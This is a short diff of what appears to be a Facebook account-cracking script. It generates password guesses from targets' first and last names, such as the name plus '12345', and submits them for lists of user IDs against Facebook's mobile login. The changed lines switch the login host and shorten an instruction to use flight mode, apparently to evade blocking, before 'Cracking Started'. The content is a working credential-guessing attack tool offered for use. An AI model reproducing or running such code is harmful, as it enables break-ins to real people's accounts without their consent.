@@ -253,7 +253,7 @@ class __xxx__:
                         else:
                             pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                             pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
-                        jxsworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
+                        jxsworld.submit(self.__metode__, uid, pwx, "m.facebook.com")
                     except:
                         pass
             hasil(ok,cp)
@@ -267,7 +267,7 @@ class __xxx__:
             p4 = input('  Name + 4 : ')
             os.system("clear")
             print(logo)
-            print("\033[1;31m\rUse flight (airplane) mode before use\033[1;37m")
+            print("\033[1;31m\rUse flight mode before use\033[1;37m")
             print(47*"-")
             print('\033[1;37m Total IDs : %s ' % len(self.id))
             print('\033[1;37m Cracking Started...')
